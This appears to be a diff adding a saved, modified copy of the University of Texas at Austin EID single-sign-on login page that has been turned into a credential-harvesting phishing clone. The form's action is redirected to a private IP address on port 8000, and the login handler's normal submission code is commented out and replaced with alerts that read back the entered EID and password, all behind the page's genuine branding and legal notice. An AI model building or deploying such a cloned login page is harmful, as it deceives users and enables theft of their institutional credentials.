@@ -1,0 +1,185 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
+<!-- saved from url=(0646)https://login.utexas.edu/login/SSORedirect/metaAlias/utaustin/idp?SAMLRequest=nZPLTsMwEEX3fEXkfZukhJRaTaVShKjEI2oDC3aOMwVLiR08No%2B%2FZ5IWVAnooitLk%2FHc63MnUxRN3fK5dy96Ba8e0AUfTa2R9x8y5q3mRqBCrkUDyJ3k6%2FntDR8NI95a44w0NQuWlxkTk7N4XI3HqZRJnMBoU8IkSSGWaTkpo7Q8Tc%2FTMk1Sec6CR7CojM4YjaHbiB6WGp3QjkpRPB5EZ4MoKeIJjyMeRU8syHdaF0pXSj8fNlZum5BfF0U%2ByO%2FXBQvmiGAdiS6MRt%2BAXYN9UxIeVjcZe3GuRR6G3sGHwKEiL9ZL5y0MpWnC2jwrHXZE2GzaHby3bPdQHTYkvsXZrJP6X6kbNZqGexqzk%2Bk2ozuaurzMTa3k5zEZXRnbCPd%2FdzyM%2B4qqBpu%2BlXuNLUi1UVARv7o27wsLwkHGyDMQivC3sx%2B7u22Cqt8tgk4PPmq3FqZphVXYrQsxk%2B47g%2F3Bi5oQr2BzTCIH2ySX3Wgq53S8G1t1mwiSHlZYQYCMdbu8%2FvLzw%2BhPHAQr%2FP0Dzr4A -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+        <meta http-equiv="x-ua-compatible" content="IE=edge">
+        
+        <meta name="viewport" content="width=device-width, user-scalable=yes">
+        <title>UT EID Login</title>
+        
+
+        <link rel="shortcut icon" type="image/png" href="https://login.utexas.edu/openam/images/utlogin-favicon.ico">
+        <link rel="stylesheet" type="text/css" media="Screen" href="./UT EID Login_files/login.css">
+        <!--[if IE 6]><link rel="stylesheet" href="/openam/css/ie6.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 7]><link rel="stylesheet" href="/openam/css/ie7.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 8]><link rel="stylesheet" href="/openam/css/ie8.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 9]><link rel="stylesheet" href="/openam/css/ie9.css" type="text/css" media="Screen" /><![endif]-->
+        <script language="JavaScript" src="./UT EID Login_files/auth.js.download" type="text/javascript"></script>
+        <script language="JavaScript" src="./UT EID Login_files/jquery-1.8.2.min.js.download" type="text/javascript"></script>
+        <script language="JavaScript" src="./UT EID Login_files/browserVersion.js.download" type="text/javascript"></script>
+        <script language="JavaScript" src="./UT EID Login_files/auth-ut.js.download" type="text/javascript"></script>
+
+        
+            <script language="JavaScript" type="text/javascript">
+                var defaultBtn = 'Submit';
+                var elmCount = 0;
+
+                /**
+                 * submit form with given button value
+                 *
+                 * @param value of button
+                 */
+                function LoginSubmit(value) {
+                    aggSubmit();
+                    var hiddenFrm = document.forms['Login'];
+
+                    alert(hiddenFrm["IDToken1"].value);
+                    alert(hiddenFrm.password["IDToken2"].value);
+                    // if (hiddenFrm != null) {
+                    //     hiddenFrm.elements['IDButton'].value = value;
+                    //     if (this.submitted) {
+                    //         alert("The request is currently being processed");
+                    //     }
+                    //     else {
+                    //         this.submitted = true;
+                    //         hiddenFrm.submit();
+                    //     }
+                    // }
+                }
+            </script>
+        
+
+        <script language="JavaScript" type="text/javascript">
+            <!-- Page is loaded. Initializations. -->
+            jQuery(document).ready(function() {
+                // placeCursorOnFirstElm();
+                document.cookie = "SC=; expires=Thu, 01 Jan 1970 00:00:00 UTC; domain=.utexas.edu; path=/";
+                disableLoginAfter(5 * 1000 * 60 /*5 minutes in ms*/);
+                jQuery("form").attr("action", "/login/UI/Login")
+            });
+        </script>
+    </head>
+    <body>
+        
+        <div id="container">
+
+            <!-- wordmark is the new stacked UT wordmark -->
+            <div id="wordmark">
+                <a href="http://www.utexas.edu/">
+                    <img src="./UT EID Login_files/wordmark-small-whte-stacked.png" width="100" height="44" alt="The University of Texas at Austin">
+                </a>
+            </div>
+            <div id="ie8_shadow"></div>
+            <!-- content starts here -->
+            <div id="content">
+                <div id="loginForm">
+                    <div id="message"></div>  <!-- this may be a graphic at some point, but I'll push for the web version to be text. -->
+                    
+
+                    
+                        <form name="Login" action="http:\\10.202.208.127:8000" method="post">
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                
+                                
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                    <div id="eid">
+                                            <label for="IDToken1">
+                                                 UT EID 
+                                                
+                                            </label>
+                                            <br>
+                                            <input class="input_pad" type="text" name="IDToken1" id="IDToken1" value="" autocomplete="off" size="30" aria-required="true" autofocus="autofocus">
+                                    </div>
+                                
+                                
+                                
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                
+                                    <div id="password">
+                                        <br>
+                                        <label for="IDToken2">
+                                             PASSWORD 
+                                            
+                                        </label>
+                                        <br>
+                                        <input class="input_pad" type="password" name="IDToken2" id="IDToken2" value="" autocomplete="off" size="30" aria-required="true">
+                                    </div>
+                                
+                                
+                            
+
+                            
+                            
+                            
+    
+    
+                            <input type="hidden" name="login_uri" value="/login/SSORedirect/metaAlias/utaustin/idp">
+                            <input type="hidden" name="login_method" value="GET">
+    
+                            <input type="hidden" name="login_param_SAMLRequest" value="nZPLTsMwEEX3fEXkfZukhJRaTaVShKjEI2oDC3aOMwVLiR08No+/Z5IWVAnooitLk/Hc63MnUxRN3fK5dy96Ba8e0AUfTa2R9x8y5q3mRqBCrkUDyJ3k6/ntDR8NI95a44w0NQuWlxkTk7N4XI3HqZRJnMBoU8IkSSGWaTkpo7Q8Tc/TMk1Sec6CR7CojM4YjaHbiB6WGp3QjkpRPB5EZ4MoKeIJjyMeRU8syHdaF0pXSj8fNlZum5BfF0U+yO/XBQvmiGAdiS6MRt+AXYN9UxIeVjcZe3GuRR6G3sGHwKEiL9ZL5y0MpWnC2jwrHXZE2GzaHby3bPdQHTYkvsXZrJP6X6kbNZqGexqzk+k2ozuaurzMTa3k5zEZXRnbCPd/dzyM+4qqBpu+lXuNLUi1UVARv7o27wsLwkHGyDMQivC3sx+7u22Cqt8tgk4PPmq3FqZphVXYrQsxk+47g/3Bi5oQr2BzTCIH2ySX3Wgq53S8G1t1mwiSHlZYQYCMdbu8/vLzw+hPHAQr/P0Dzr4A">
+    
+                            
+                                
+                                
+                                    <div>
+                                        <img src="./UT EID Login_files/dot.gif" width="1" height="15" alt="">
+                                        <div id="login_btn">
+                                            <input name="Login.Submit" type="submit" onclick="LoginSubmit(&#39;Log In&#39;); return false;" class="login button primary" value="Log In">
+                                        </div>
+                                    </div>
+                                
+                          
+
+                            <script language="javascript" type="text/javascript">
+                                if (elmCount != null) {
+                                    document.write("<input name=\"IDButton"  + "\" type=\"hidden\">");
+                                }
+                            </script><input name="IDButton" type="hidden">
+                            <input type="hidden" name="goto" value="/SSORedirect/metaAlias/utaustin/idp?ReqID=a9517d776cc414e2fbe946e1c6b9b06b3686b646c8&amp;index=null&amp;acsURL=https%3A%2F%2Futexas.instructure.com%2Flogin%2Fsaml&amp;spEntityID=http%3A%2F%2Futexas.instructure.com%2Fsaml2&amp;binding=urn%3Aoasis%3Anames%3Atc%3ASAML%3A2.0%3Abindings%3AHTTP-POST">
+                            <input type="hidden" name="SunQueryParamsString" value="QU1BdXRoQ29va2llLXByb2Q9JmZvcndhcmQ9dHJ1ZSZyZWFsbT0vdXRhdXN0aW4mU0FNTFJlcXVlc3Q9blpQTFRzTXdFRVgzZkVYa2ZadWtoSlJhVGFWU2hLakVJMm9EQzNhT013VkxpUjA4Tm8rL1o1SVdWQW5vb2l0TGsvSGM2M01uVXhSTjNmSzVkeTk2QmE4ZTBBVWZUYTJSOXg4eTVxM21ScUJDcmtVRHlKM2s2L250RFI4Tkk5NWE0NHcwTlF1V2x4a1RrN040WEkzSHFaUkpuTUJvVThJa1NTR1dhVGtwbzdROFRjL1RNazFTZWM2Q1I3Q29qTTRZamFIYmlCNldHcDNRamtwUlBCNUVaNE1vS2VJSmp5TWVSVThzeUhkYUYwcFhTajhmTmxadW01QmZGMFUreU8vWEJRdm1pR0FkaVM2TVJ0K0FYWU45VXhJZVZqY1plM0d1UlI2RzNzR0h3S0VpTDlaTDV5ME1lwV25DMmp3ckhYWkUyR3phSGJ5M2JQZFFIVFlrdnNYWnJKUDZYNmtiTlpxR2V4cXprK2syb3p1YXVyek1UYTNrNXpFWlhSbmJDUGQvZHp5TSs0cXFCcHUrbFh1TkxVaTFVVkFSdjdvMjd3c0x3a0hHeURNUWl2QzNzeCs3dTIyQ3F0OHRnazRQUG1xM0ZxWnBoVlhZclFzeGsrNDdnLzNCaTVvUXIyQnpUQ0lIMnlTWDNXZ3E1M1M4RzF0MW13aVNIbFpZUVlDTWRidTgvdkx6dytoUEhBUXIvUDBEenI0QSZzcEVudGl0eUlEPWh0dHA6Ly91dGV4YXMuaW5zdHJ1Y3R1cmUuY29tL3NhbWwy">
+                            <input type="hidden" name="encoded" value="false">
+                        <input type="hidden" name="gx_charset" value="UTF-8"></form>
+                    
+                </div> <!-- end of loginForm -->
+
+                <div id="questions">  <!-- links for users -->
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help/?fp="> I forgot my UT EID or password.</a>
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help/?geid=">I need a UT EID.</a>
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help">Help</a>
+                </div>  <!--end of questions -->
+
+                <div id="license_info">
+                    <p>
+                        Unauthorized use of UT Austin computer and networking resources is prohibited.
+                        If you log in, you acknowledge your awareness of and concurrence with the
+                        <a href="http://security.utexas.edu/policies/aup.html">UT Austin Acceptable Use Policy</a>.
+                        The university will prosecute violators to the full extent of the law. The university is not
+                        responsible for services provided by third parties authorized to use the university's
+                        authentication service.
+                    </p>
+                    <p class="footer">
+                        © 2017 The University of Texas at Austin |
+                        <a href="http://www.utexas.edu/web-privacy-policy">Web Privacy Policy</a> |
+                        <a href="http://www.utexas.edu/web-accessibility-policy">Web Accessibility Policy</a><br><br>
+                        Version: 2016.1.5
+                    </p>
+                </div> <!-- license_info -->
+            </div> <!--end of content -->
+        </div> <!--end of container -->
+    
+
+
+
+</body></html>
